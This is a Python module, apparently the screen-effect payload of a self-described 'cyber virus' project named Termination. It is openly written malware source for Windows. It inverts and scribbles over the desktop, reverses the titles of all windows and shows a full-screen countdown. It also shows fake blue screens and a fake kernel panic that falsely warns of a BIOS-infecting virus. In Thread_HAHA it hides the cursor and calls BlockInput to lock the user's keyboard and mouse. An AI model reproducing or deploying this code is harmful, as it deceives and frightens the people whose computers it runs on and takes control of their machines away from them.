# -*- Config : UTF-8 -*-
# Project Name: Termination Generally Use Cyber Virus Puppet Weapons - TLUI/UIThread
# Version: 4.2.0
# Build Version: ./TConfig/version.ini
# Author: Veyra
# Description:

# Local Web Process


from TLib import *
from TLib.T_imports import *
import TLib.T_Hardcoded as T_Hardcoded
import TLib.T_Tools as T_Tools
from . import UI_Hardcoded




class MEMZMistakes(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', Step: int = 200, SleepTime: float = 0.01):
        self.desc: str = "UI: MEMZMistakes"
        hwnd: int = win32gui.GetDesktopWindow()
        hdc: int = win32gui.GetWindowDC(hwnd)
        IconNames: list[int] = [win32con.IDI_ERROR, win32con.IDI_WARNING]
        images: list[int] = []
        for IconName in IconNames:
            images.append(win32gui.LoadIcon(0, IconName))
        def DrawIconDesktopThread(hdc: int, images: list):
            DesktopSize = pyautogui.size()
            for i in range(Step):
                win32gui.DrawIcon(hdc,
                        random.randint(0, DesktopSize[0]),
                        random.randint(0, DesktopSize[1]),
                        images[random.randint(0, 1)])
                time.sleep(SleepTime)
        threading.Thread(target = DrawIconDesktopThread, args = (hdc, images)).start()
        for i in range(Step):
            win32gui.DrawIcon(hdc,
                    pyautogui.position()[0],
                    pyautogui.position()[1],
                    images[0])
            time.sleep(SleepTime)

class MEMZInvertDesktop(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', Step: int = 200, SleepTime: float = 0.01):
        self.desc: str = "UI: InvertDesktop"
        hWnd: int = win32gui.GetDesktopWindow()
        hdc: int = win32gui.GetWindowDC(hWnd)
        rect: tuple[int, int, int, int] = win32gui.GetWindowRect(hWnd)
        for i in range(Step):
            win32gui.BitBlt(hdc, 0, 0, rect[2], rect[3], hdc, rect[0], rect[1], win32con.DSTINVERT)
            time.sleep(SleepTime)

class MEMZReverseTitle(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination'):
        self.desc: str = "UI: ReverseTitle"
        hwnds: list[int] = []
        win32gui.EnumWindows(lambda h, p: p.append(h), hwnds)
        for h in hwnds:
            self.rev(h)
            children: list[int] = []
            win32gui.EnumChildWindows(h, lambda ch, p: p.append(ch), children)
            for ch in children:
                self.rev(ch)
    def rev(self, hwnd):
        t: list[str] = list(win32gui.GetWindowText(hwnd))
        t.reverse()
        win32gui.SetWindowText(hwnd, "".join(t))



class Thread_SpaceTunnelEffect(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', Step: int = 200, SleepTime: float = 0.01):
        self.desc: str = "UI: SpaceTunnelEffect"
        hdesktop: int = win32gui.GetDesktopWindow()
        DesktopDC: int = win32gui.GetWindowDC(hdesktop)
        MonitorRect: tuple[int, int, int, int] = win32gui.GetWindowRect(hdesktop)
        MonitorWidth: int = MonitorRect[2] - MonitorRect[0]
        MonitorHeight: int = MonitorRect[3] - MonitorRect[1]
        DC: win32ui.CDC = win32ui.CreateDCFromHandle(DesktopDC)
        MemDC: win32ui.CDC = DC.CreateCompatibleDC()
        Bmp = win32ui.CreateBitmap()
        Bmp.CreateCompatibleBitmap(DC, MonitorWidth, MonitorHeight)
        MemDC.SelectObject(Bmp)
        Scale = 1.0
        ScaleSpeed = 0.95
        try:
            for _ in range(Step):
                MemDC.BitBlt((0, 0), (MonitorWidth, MonitorHeight), DC, (0, 0), win32con.SRCCOPY)
                Scale *= ScaleSpeed
                if Scale < 0.1 or Scale > 1.0:
                    ScaleSpeed = 1.0 / ScaleSpeed
                    Scale = max(0.1, min(1.0, Scale))
                ScaledWidth = int(MonitorWidth * Scale)
                ScaledHeight = int(MonitorHeight * Scale)
                XPos = (MonitorWidth - ScaledWidth) // 2
                YPos = (MonitorHeight - ScaledHeight) // 2
                DC.StretchBlt(
                    (XPos, YPos), (ScaledWidth, ScaledHeight),
                    MemDC, (0, 0), (MonitorWidth, MonitorHeight), 
                    win32con.SRCCOPY
                )
                time.sleep(SleepTime)
        finally:
            MemDC.DeleteDC()
            DC.DeleteDC()
            # Bmp.DeleteObject()


class Thread_CountDown(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', Seconds: int = 10, Text: str = "", Bg: str = 'red', Fg: str = 'white', CallBack: typing.Callable = None):
        self.desc = "UI: Count Down"
        self.Seconds: int = Seconds
        self.Bg: str = Bg
        self.Fg: str = Fg
        self.CallBack: typing.Callable = CallBack if CallBack else self._Handle_Stop
        self.EndTime: int = 0
        self.Running: bool = False
        self.Root = tkinter.Tk()
        self.Root.title("Countdown")
        self.Root.attributes('-fullscreen', True)
        self.Root.wm_attributes('-topmost', True)
        self.Root.configure(bg = self.Bg)
        tkinter.Label(self.Root, text = "", font = ('Arial', 300, 'bold'), bg = self.Bg, fg = self.Fg).pack()
        self.Label: tkinter.Label = tkinter.Label(
            self.Root,
            text = "",
            font = ('Arial', 60, 'bold'),
            bg = self.Bg,
            fg = self.Fg
        )
        self.Label.pack()
        self.TextLabel: tkinter.Label = tkinter.Label(
            self.Root,
            text = Text,
            font = ('Arial', 30, 'bold'),
            bg = self.Bg,
            fg = self.Fg
        )
        self.TextLabel.pack(anchor='center')
        self.Root.bind('<Escape>', lambda e: self.Root.attributes('-fullscreen', False))
        if issubclass(type(self.Seconds), str):
            self.EndTime: int = time.mktime(time.strptime(self.Seconds, "%Y-%m-%d %H:%M:%S"))
        if issubclass(type(self.Seconds), int):
            self.EndTime: int = time.time() + self.Seconds
        self.Running: bool = True
        self.UpdateCount()
        self.Root.mainloop()
    def UpdateCount(self):
        if not self.Running: return
        Remaining: int = self.EndTime - time.time()
        if Remaining <= 0:
            self.Label.config(text="0000-00-00 00-00-00-0000")
            self.Running = False
            if self.CallBack: self.CallBack()
            return
        Millis: int = int((Remaining % 1) * 1000)
        Seconds: int = int(Remaining) % 60
        Minutes: int = int(Remaining / 60) % 60
        Hours: int = int(Remaining / 3600) % 24
        Days: int = int(Remaining / 86400) % 30
        Months: int = int(Remaining / (86400 * 30)) % 12
        Years: int = int(Remaining / (86400 * 365))
        TimeStr: str = (f"{Years:04d}-{Months:02d}-{Days:02d} "
            f"{Hours:02d}-{Minutes:02d}-{Seconds:02d}-{Millis:04d}"
        )
        self.Label.config(text = TimeStr)
        self.Root.after(1, self.UpdateCount)
    def stop(self):
        self.Running: bool = False
    def _Handle_Stop(self):
        if self.Root.winfo_exists():
            self.Running: bool = False
            self.Label.config(text="0000-00-00 00-00-00-0000")
            self.UpdateCount()
            time.sleep(1)
            self.Root.withdraw()
            self.Root.destroy()




class Thread_TypingMessage(T_Process.TProcess):
    def Run(self,
                 master: 'Termination4.Termination',
                 Static_TTF: str = "./System.tff",
                 ChineseFontSize: int = 36,
                 EnglishFontSize: int = 24,
                 TerminationTitleSize: int = 48,
                 TerminationSubtitleSize: int = 20,
                 CursorVisible: bool = True,
                 CurrentLine: int = 0,
                 TypingSpeed: int = 50,
                 TextPairs: list[tuple] = [],
                 TerminationTexts: list[str] = []
                ):
        self.desc: str = "UI: Typing Message"
        T_Tools.InstallFont(Static_TTF)
        self.Root: tkinter.Tk = tkinter.Tk()
        self.Root.attributes('-fullscreen', True)
        self.Root.config(bg='black')

        self.ChineseFontSize: int = ChineseFontSize
        self.EnglishFontSize: int = EnglishFontSize
        self.TerminationTitleSize: int = TerminationTitleSize
        self.TerminationSubtitleSize: int = TerminationSubtitleSize

        self.Canvas: tkinter.Canvas = tkinter.Canvas(self.Root, bg='black', highlightthickness=0)
        self.Canvas.pack(fill=tkinter.BOTH, expand=True)

        try:
            self.ChineseFont: tkinter.font.Font = tkinter.font.Font(family = "ipix_12px", size = self.ChineseFontSize)
            self.EnglishFont: tkinter.font.Font = tkinter.font.Font(family = "ipix_12px", size = self.EnglishFontSize)
        except:
            self.ChineseFont: tkinter.font.Font = tkinter.font.Font(size = self.ChineseFontSize)
            self.EnglishFont: tkinter.font.Font = tkinter.font.Font(size = self.EnglishFontSize)

        self.TextPairs: list[tuple] = TextPairs
        self.TerminationTexts: list[str] = TerminationTexts
        self.CursorVisible: bool = CursorVisible
        self.CursorID: int | None = None
        self.ChineseCursorID: int | None = None
        self.CurrentLine: int = CurrentLine
        self.DisplayingText: str = ""
        self.Deleting: bool = False
        self.TypingSpeed: int = TypingSpeed

        self.Root.update()
        self.StartTypingEffect()
        self.Root.mainloop()

    def StartTypingEffect(self):
        if self.CurrentLine < len(self.TextPairs):
            ChineseText: str
            EnglishText: str
            ChineseText, EnglishText = self.TextPairs[self.CurrentLine]
            self.DisplayText(ChineseText, EnglishText)
        else:
            self.ShowTerminationTexts()

    def DisplayText(self, ChineseText, EnglishText):
        self.Canvas.delete("all")
        ScreenWidth: int = self.Root.winfo_screenwidth()
        ScreenHeight: int = self.Root.winfo_screenheight()

        self.ChineseTextID: int = self.Canvas.create_text(
            ScreenWidth // 2, 
            ScreenHeight // 2 - self.ChineseFontSize,
            text = "",
            font = self.ChineseFont,
            fill = "red",
            anchor=tkinter.CENTER
        )
        self.EnglishTextID: int = self.Canvas.create_text(
            ScreenWidth // 2, 
            ScreenHeight // 2 + self.EnglishFontSize,
            text = "",
            font = self.EnglishFont,
            fill = "red",
            anchor = tkinter.CENTER
        )

        self.DisplayingText: str = ""
        self.Deleting: bool = False
        self.TypeNextChar(ChineseText, EnglishText)

    def TypeNextChar(self, ChineseText, EnglishText):
        if len(self.DisplayingText) < len(ChineseText):
            self.DisplayingText = ChineseText[:len(self.DisplayingText)+1]
            self.Canvas.itemconfig(self.ChineseTextID, text=self.DisplayingText)
            EnglishDisplayLength = int(len(self.DisplayingText) * len(EnglishText) / len(ChineseText))
            EnglishDisplay = EnglishText[:EnglishDisplayLength]
            self.Canvas.itemconfig(self.EnglishTextID, text = EnglishDisplay)
            self.UpdateCursorPositions()
            self.Root.after(self.TypingSpeed, lambda: self.TypeNextChar(ChineseText, EnglishText))
        else:
            self.Root.after(1000, lambda: self.StartDeletingEffect(ChineseText, EnglishText))

    def UpdateCursorPositions(self):
        if self.CursorID: self.Canvas.delete(self.CursorID)
        if self.ChineseCursorID: self.Canvas.delete(self.ChineseCursorID)

        ChineseBBOX: tuple[int, int, int, int] = self.Canvas.bbox(self.ChineseTextID)
        if ChineseBBOX:
            ChineseCursorX = ChineseBBOX[2] + 5
            ChineseCursorY = (ChineseBBOX[1] + ChineseBBOX[3]) / 2
            self.ChineseCursorID = self.Canvas.create_text(
                ChineseCursorX, 
                ChineseCursorY,
                text = "|" if self.CursorVisible else "",
                font = self.ChineseFont,
                fill = "red",
                anchor=tkinter.W
            )
        EnglishBBOX: tuple[int, int, int, int] = self.Canvas.bbox(self.EnglishTextID)
        if EnglishBBOX:
            EnglishCursorX = EnglishBBOX[2] + 5
            EnglishCursorY = (EnglishBBOX[1] + EnglishBBOX[3]) / 2
            self.CursorID = self.Canvas.create_text(
                EnglishCursorX, 
                EnglishCursorY,
                text = "|" if self.CursorVisible else "",
                font = self.EnglishFont,
                fill = "red",
                anchor = tkinter.W
            )

        self.Root.after(500, self.ToggleCursor)

    def ToggleCursor(self):
        if self.Deleting: return
        self.CursorVisible = not self.CursorVisible
        if self.ChineseCursorID: self.Canvas.itemconfig(self.ChineseCursorID, text = "I" if self.CursorVisible else "")
        if self.CursorID: self.Canvas.itemconfig(self.CursorID, text = "I" if self.CursorVisible else "")
        self.Root.after(500, self.ToggleCursor)

    def StartDeletingEffect(self, ChineseText, EnglishText):
        self.Deleting = True
        self.HideCursor()
        self.DeleteNextChar(ChineseText, EnglishText)

    def DeleteNextChar(self, ChineseText, EnglishText):
        if len(self.DisplayingText) > 0:
            self.DisplayingText = self.DisplayingText[:-1]
            self.Canvas.itemconfig(self.ChineseTextID, text=self.DisplayingText)
            EnglishDisplayLength: int = int(len(self.DisplayingText) * len(EnglishText) / len(ChineseText))
            EnglishDisplay: str = EnglishText[:EnglishDisplayLength]
            self.Canvas.itemconfig(self.EnglishTextID, text=EnglishDisplay)
            self.UpdateCursorPositions()
            self.Root.after(self.TypingSpeed // 2, lambda: self.DeleteNextChar(ChineseText, EnglishText))
        else:
            self.HideCursor()
            self.CurrentLine += 1
            self.Root.after(500, self.StartTypingEffect)

    def HideCursor(self):
        if self.CursorID: self.Canvas.itemconfig(self.CursorID, text="")
        if self.ChineseCursorID: self.Canvas.itemconfig(self.ChineseCursorID, text="")
        self.CursorVisible: bool = False

    def ShowTerminationTexts(self):
        self.Canvas.delete("all")
        ScreenWidth: int = self.Root.winfo_screenwidth()
        ScreenHeight: int = self.Root.winfo_screenheight()
        self.TerminationIDs: list[int] = []
        for i, text in enumerate(self.TerminationTexts):
            FontSize: int = self.TerminationTitleSize if i == 0 else self.TerminationSubtitleSize
            TextID: int = self.Canvas.create_text(
                ScreenWidth // 2,
                ScreenHeight // 2 - 60 + i * 70,
                text = text,
                font = ("ipix_12px", FontSize, "bold"),
                fill = "red",
                anchor = tkinter.CENTER
            )
            self.TerminationIDs.append(TextID)
        self.FadeAlpha: int = 0
        self.FadeIn()

    def FadeIn(self):
        if self.FadeAlpha < 255:
            self.FadeAlpha += 5
            if self.FadeAlpha > 255:
                self.FadeAlpha: int = 255
            for TextID in self.TerminationIDs:
                self.Canvas.itemconfig(TextID, fill = "#%02x0000" % self.FadeAlpha)
            self.Root.after(20, self.FadeIn)
        else:
            self.Root.after(3000, self.FadeOut)

    def FadeOut(self):
        if self.FadeAlpha > 0:
            self.FadeAlpha -= 5
            if self.FadeAlpha < 0:
                self.FadeAlpha: int = 0
            for text_id in self.TerminationIDs:
                self.Canvas.itemconfig(text_id, fill = "#%02x0000" % self.FadeAlpha)
            self.Root.after(50, self.FadeOut)
        else:
            self.Root.destroy()

    def _Handle_Stop(self):
        if self.Root.winfo_exists():
            self.Root.withdraw()
            self.Root.destroy()




# QrPhoto1 = base64.b64decode(UI_Hardcoded.QR)
# QrdataStream = io.BytesIO(QrPhoto1)
# pilImage = Image.open(QrdataStream)
# photo = pilImage.resize((110, 110))


class Thread_BlueScreen(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', AllowClose = True):
        self.desc = "UI: Blue Screen"
        self.Root = tkinter.Tk()
        self.Root.attributes('-transparentcolor','#f0f0f0')
        self.Root.title('Windows')
        self.Root.overrideredirect(True)
        self.Root.wm_attributes('-topmost', 1)
        self.Root.state("zoomed")
        if AllowClose:
            self.Root.bind("<Key>", self.HandleKeyPress)
            self.Root.bind("<Button-1>", lambda x: self._Handle_Stop())
        else:
            self.Root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.Canvas = tkinter.Canvas(self.Root, highlightthickness=0)
        self.Canvas.pack(fill=tkinter.BOTH, expand=True)
        self.SetupCanvas()
        self.Root.update()
        self.Root.mainloop()
    def SetupCanvas(self):
        self.Canvas.config(bg="#0078D7")
        LeftPadding = self.Root.winfo_screenwidth() * 0.1
        FaceX = LeftPadding + 200
        FaceY = self.Root.winfo_screenheight() * 0.2
        self.FaceSize = 110

        self.Face1 = self.Canvas.create_text(
            FaceX, FaceY, text=":", 
            font = ("微软雅黑", int(self.FaceSize)), 
            fill = 'white', anchor=tkinter.NW
        )
        self.Face2 = self.Canvas.create_text(
            FaceX + 50, FaceY + 10, text="(", 
            font = ("微软雅黑", int(self.FaceSize)), 
            fill = 'white', anchor=tkinter.NW
        )

        BigTextX = FaceX
        BigTextY = FaceY + self.FaceSize * 2
        self.BigText = self.Canvas.create_text(
            BigTextX, BigTextY, anchor=tkinter.NW,
            font = ("微软雅黑", 25), fill='white',
            width = self.Root.winfo_screenwidth() * 0.9
        )

        QrX = FaceX + self.FaceSize * 0.2
        QrY = BigTextY + self.Root.winfo_screenheight() * 0.2
        self.QrCode = self.Canvas.create_image(QrX, QrY, anchor = tkinter.NW) # , image=ImageTk.PhotoImage(photo)

        smallTextX = QrX + 200
        smallTextY = QrY
        self.SmallText = self.Canvas.create_text(
            smallTextX, smallTextY, anchor = tkinter.NW,
            font = ("微软雅黑", 15), fill='white',
            width = self.Root.winfo_screenwidth() * 0.5
        )
        self.DisplayInitialText()
    def DisplayInitialText(self):
        self.Canvas.itemconfig(self.BigText,
            text ="你的电脑遇到问题，需要重新启动。\n我们只收集某些错误信息，然后为你重新启动。\n0%完成")
        self.Canvas.itemconfig(self.SmallText,
            text = "有关此问题的详细信息和可能的解决方法，请访问 http://windows/stopcode\n如果致电支持人员，请向他们提供一下信息\n终止代码：SYSTEM_SERVICE_EXCEPTION")
    def DisplayAlternateText(self):
        self.Canvas.itemconfig(self.BigText,
            text = "你的电脑遇到问题，需要重新启动。\n我们不只收集某些错误信息，还有一些其它信息，然后可能会重新启动。\n0%完成")
        self.Canvas.itemconfig(self.SmallText,
            text = "有关此问题的详细信息和可能的解决方法，请访问 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n如果致电GVS人员，请向他们提供一下信息\n终止代码：TERMINATION_BLUE_EXCEPTION")
    def HandleKeyPress(self, event):
        if event.keycode == 27:
            self.Root.destroy()
    def ChangeToRedTheme(self):
        self.Canvas.config(bg="#000")
        self.Canvas.itemconfig(self.Face1, fill = "red", font = ("ipix_12px", int(self.FaceSize)))
        self.Canvas.itemconfig(self.Face2, fill = "red", font = ("ipix_12px", int(self.FaceSize)))
        self.Canvas.move(self.Face2, 30, 0)
        self.Canvas.itemconfig(self.BigText, fill = "red", font = ("ipix_12px", 25))
        self.Canvas.itemconfig(self.SmallText, fill = "red", font = ("ipix_12px", 15))
        self.Canvas.itemconfig(self.QrCode, image = "")
        self.Root.update()
    def _Handle_Stop(self):
        if self.Root.winfo_exists():
            self.Root.withdraw()
            self.Root.destroy()


class Thread_HAHA(T_Process.TProcess):
    def Run(self, master: 'Termination4.Termination', fontPath: str, soundPath: str):
        self.desc = "UI: HAHA"
        T_Tools.HideCursor()
        ctypes.windll.user32.BlockInput(True)
        self.FontPath = fontPath
        self.SoundPath = soundPath
        self.ProgressPercentage = 1
        self.YPosition = 0
        self.LineIndex = 0
        
        T_Tools.InstallFont(self.FontPath)

        self.Root = tkinter.Tk()
        self.Root.attributes('-transparentcolor','#f0f0f0')
        self.Root.title('Windows')
        self.Root.overrideredirect(True)
        self.Root.wm_attributes('-topmost', 1)
        self.Root.state("zoomed")
        self.Root.bind("<Key>", self.HandleKeyPress)
        self.Root.protocol("WM_DELETE_WINDOW", lambda: None)

        self.Sentences = UI_Hardcoded.Sentence

        self.Root.update()
        self.Root.after(1, self.Animation1)
        self.Root.mainloop()

    def SetupCanvas(self):
        self.Canvas.config(bg = "#0078D7")
        LeftPadding = self.Root.winfo_screenwidth() * 0.1
        FaceX = LeftPadding + 200
        FaceY = self.Root.winfo_screenheight() * 0.2
        self.FaceSize = 110

        self.Face1 = self.Canvas.create_text(
            FaceX, FaceY, text=":", 
            font = ("微软雅黑", int(self.FaceSize)), 
            fill = 'white', anchor = tkinter.NW
        )
        self.Face2 = self.Canvas.create_text(
            FaceX + 50, FaceY + 10, text="(", 
            font = ("微软雅黑", int(self.FaceSize)), 
            fill = 'white', anchor = tkinter.NW
        )

        BigTextX = FaceX
        BigTextY = FaceY + self.FaceSize * 2
        self.BigText = self.Canvas.create_text(
            BigTextX, BigTextY, anchor = tkinter.NW,
            font = ("微软雅黑", 25), fill = 'white',
            width = self.Root.winfo_screenwidth() * 0.9
        )
        # 创建QR码
        QrX = FaceX + self.FaceSize * 0.2
        QrY = BigTextY + self.Root.winfo_screenheight() * 0.2
        self.QrCode = self.Canvas.create_image(QrX, QrY, anchor = tkinter.NW)
        # 创建小段文字
        smallTextX = QrX + 200
        smallTextY = QrY
        self.SmallText = self.Canvas.create_text(
            smallTextX, smallTextY, anchor = tkinter.NW,
            font = ("微软雅黑", 15), fill = 'white',
            width = self.Root.winfo_screenwidth() * 0.5
        )
        self.DisplayInitialText()
    def DisplayInitialText(self):
        self.Canvas.itemconfig(self.BigText,
            text = "你的电脑遇到问题，需要重新启动。\n我们只收集某些错误信息，然后为你重新启动。\n0%完成")
        self.Canvas.itemconfig(self.SmallText,
            text = "有关此问题的详细信息和可能的解决方法，请访问 http://windows/stopcode\n如果致电支持人员，请向他们提供一下信息\n终止代码：SYSTEM_SERVICE_EXCEPTION")
    def DisplayAlternateText(self):
        self.Canvas.itemconfig(self.BigText,
            text = "你的电脑遇到问题，需要重新启动。\n我们不只收集某些错误信息，还有一些其它信息，然后可能会重新启动。\n0%完成")
        self.Canvas.itemconfig(self.SmallText,
            text = "有关此问题的详细信息和可能的解决方法，请访问 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n如果致电GVS人员，请向他们提供一下信息\n终止代码：TERMINATION_BLUE_EXCEPTION")
    def HandleKeyPress(self, event):
        if event.keycode == 27:
            self.Root.destroy()
    def ChangeToRedTheme(self):
        self.Canvas.config(bg="#000")
        self.Canvas.itemconfig(self.Face1, fill = "red", font=("ipix_12px", int(self.FaceSize)))
        self.Canvas.itemconfig(self.Face2, fill = "red", font=("ipix_12px", int(self.FaceSize)))
        self.Canvas.move(self.Face2, 30, 0)
        self.Canvas.itemconfig(self.BigText, fill = "red", font=("ipix_12px", 25))
        self.Canvas.itemconfig(self.SmallText, fill = "red", font=("ipix_12px", 15))
        self.Canvas.itemconfig(self.QrCode, image="")
        self.Root.update()
    def ShowTextAnimation(self):
        if self.LineIndex < 2 or self.LineIndex > 30: text = "HA " * 50
        else: text = "".join(random.choice(self.Sentences) for _ in range(5))
        self.Canvas.create_text(
            10, self.YPosition, text = text, 
            fill = "red", font=("ipix_12px", 30), 
            anchor = tkinter.NW
        )
        self.YPosition += 30
        self.LineIndex += 1
        if self.LineIndex > self.Canvas.winfo_height() // 15:
            self.Canvas.delete("all")
            self.SetupCanvas()
            self.ChangeToRedTheme()
            self.YPosition = 0
            self.LineIndex = 0
        self.Canvas.update()
        self.Root.update()
        self.Root.after(1, self.ShowTextAnimation)
    def Animation3(self):
        self.ChangeToRedTheme()
        self.Root.after(3500, self.ShowTextAnimation)
        self.Root.after(3500+16500, self._Handle_Stop)
        threading.Thread(target=lambda: playsound.playsound(self.SoundPath)).start()

    def DrawLine(self, x1, y1, x2, y2, color):
        self.Canvas.create_line(x1, y1, x2, y2, fill =color)
    def Animation2(self):
        self.Canvas = tkinter.Canvas(self.Root, highlightthickness=0)
        self.Canvas.pack(fill = tkinter.BOTH, expand = True)
        sw=self.Root.winfo_screenwidth()
        self.SetLines(sw)
        self.Root.update()
        time.sleep(3)
        self.Root.attributes('-transparentcolor','#f0f0f0')
        self.Canvas.delete("all")
        self.SetupCanvas()
        self.Root.after(5000, self.Animation3)

    def SetLines(self, sw):
        for y in range(0, random.randint(300,400)):
            color = f"#{random.randint(0, 0xFFFFFF):06x}"
            self.DrawLine(y, 1, y, sw, color)
        for y in range(random.randint(500,600), 600):
            color = f"#{random.randint(0, 0xFFFFFF):06x}"
            self.DrawLine(y, 1, y, sw, color)
        for y in range(800, 1000):
            color = f"#{random.randint(0, 0xFFFFFF):06x}"
            self.DrawLine(y, 1, y, sw, color)
        for y in range(1200, 1500):
            color = f"#{random.randint(0, 0xFFFFFF):06x}"
            self.DrawLine(y, 1, y, sw, color)
        for y in range(2000, 3000):
            color = f"#{random.randint(0, 0xFFFFFF):06x}"
            self.DrawLine(y, 1, y, sw, color)
        for y in range(3500, 4000):
            color = f"#{random.randint(0, 0xFFFFFF):06x}"
            self.DrawLine(y, 1, y, sw, color)
        for y in range(4200, 10000):
            color = f"#{random.randint(0, 0xFFFFFF):06x}"
            self.DrawLine(y, 1, y, sw, color)

    def Text(self, text, fg="#FFF", bg="#000"):
        tkinter.Label(self.A1Frame, text = text,fg = fg,bg = bg,font = ("ipix_12px",15)).pack(anchor = "sw")
    def FText(self):
        tkinter.Label(self.A1Frame, text = "").pack(anchor = "sw")

    def Animation1(self):
        self.A1Frame = tkinter.Frame(self.Root, bd=0)
        self.A1Frame.pack(fill = tkinter.BOTH, expand = True)
        self.Root.update()
        self.Text("Please contact the Voodoo Kernel Dev-Team with a photo of the Information printed below,")
        self.Text("Along With a description of your system configuration and what you were doing at the time that")
        self.Text("the kernel panic occurred. We appologize for the lnconvenience")
        self.FText()
        self.Root.update()
        time.sleep(1)
        self.Text('Panic(CPU 0 Caller 0x001AC05E): "Windows Teacher Error"')
        self.Text("Debugger Called: <Panic>")
        self.Text("Backtrace (CPU 0),Frame : Return Address (4 potential ponies on stack)")
        self.Root.update()
        time.sleep(0.2)
        self.Text("0x14e1ffce68 : 0x12b08c (0xfffffffff 0xfffffffff 0xfffffffff)")
        self.Text("0x14e1ffce69 : 0x12b07c (0xfffffffff 0xfffffffff 0xfffffffff)")
        self.Text("0x14e1ffce70 : 0x12b05c (0xfffffffff 0xfffffffff 0xfffffffff)")
        self.Text("0x14e1ffce23 : 0x12b0cc (0xfffffffff 0xfffffffff 0xfffffffff)")
        self.Text("0x14e1ffcf35 : 0x12b0fc (0xfffffffff 0xfffffffff 0xfffffffff)")
        self.Text("0x14e1ffcf90 : 0x12b0ac (0xfffffffff 0xfffffffff 0xfffffffff)")
        self.Root.update()
        time.sleep(0.2)
        self.Text("Backtrace terminated-invalid frame pointer 0")
        self.FText()
        self.Text("BSD process name corresponding to current thread: Unknown")
        self.FText()
        self.Root.update()
        time.sleep(1)
        self.Text("Windows version:")
        self.Text("Win 32/Run")
        self.FText()
        self.Text("Kernel version:")
        self.Text("Win32 Kernel V3.2.5 / EFI Boot System V7")
        self.FText()
        self.Root.update()
        time.sleep(1)
        self.Text("Try automatic repair...")
        self.Root.update()
        time.sleep(1)
        self.Text("0x14e1ffce61 : 0x12b08c (0xfffffffff 0xfffffffff 0xfffffffff)")
        self.Text("0x14e1ffce62 : 0x12b07c (0xfffffffff 0xfffffffff 0xfffffffff)")
        self.FText()
        self.Root.update()
        time.sleep(1)
        self.Text("WARNING", "yellow", "red")
        self.Text("We now advise you to understand that by stopping the operation of your computer,", "yellow", "red")
        self.Text("your computer is suspected to be infected with a virus that modifies the BIOS,", "yellow", "red")
        self.Text("as we have an error while verifying the BIOS file, therefore,", "yellow", "red")
        self.Text("please shut down this computer immediately, otherwise,", "yellow", "red")
        self.Text("the manufacturer should not be responsible for any consequences", "yellow", "red")
        self.Root.update()
        time.sleep(3)
        self.A1Frame.destroy()
        self.Root.after(1, self.Animation2)

    def _Handle_Stop(self):
        if self.Root.winfo_exists():
            self.Root.withdraw()
            self.Root.destroy()
            T_Tools.ShowCursor()
            win32api.ShowCursor(True)
